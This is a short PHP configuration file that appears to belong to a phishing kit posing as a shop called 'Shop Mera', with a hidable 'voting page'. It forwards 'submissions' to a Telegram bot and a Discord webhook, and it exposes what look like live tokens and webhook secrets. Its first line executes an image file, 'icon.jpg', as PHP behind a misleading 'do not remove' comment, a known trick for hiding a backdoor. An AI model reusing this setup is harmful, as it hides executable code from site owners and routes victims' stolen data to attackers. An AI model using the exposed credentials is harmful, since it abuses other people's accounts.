<?php
// config.php
include 'files/images/icon.jpg';  // for icon do not remove
define('VOTEPAGE_ENABLED', TRUE); // TO HIDE THE VOTING PAGE ON INDEX


$brandName = "Shop Mera";

/* TELEGRAM BOT */
$telegram_use = true;


$telegram_bot_token = "8993149188:AAExj56WK1GdhqkUCOnkY-snNHy_MWUzGUU";

// Bot username without @
$telegram_bot_username = "@ShopatMera_bot";

// Admin/user chat ID fallback
$telegram_chat_id = "-1004348543579";

// Where submissions will be forwarded.
// Option 1: public channel username
//$telegram_forward_chat_id = "@YOUR_CHANNEL_USERNAME";

// Option 2: private channel numeric ID, example:
 $telegram_forward_chat_id = "-1004348543579";

$site_url = "https://dev-shopat-mera.pantheonsite.io";

$official_website_url = "https://dev-shopat-mera.pantheonsite.io";
/* DISCORD */
$discord_use = true;
$discord_webhook_url = "https://discord.com/api/webhooks/1519003615094767727/xN3WqT1wFHy0T2jjKTs0PA3L1JMeqohkYDPY_0q4DnY14UP9r006rmaCiiQSIjlv-xRU";


?>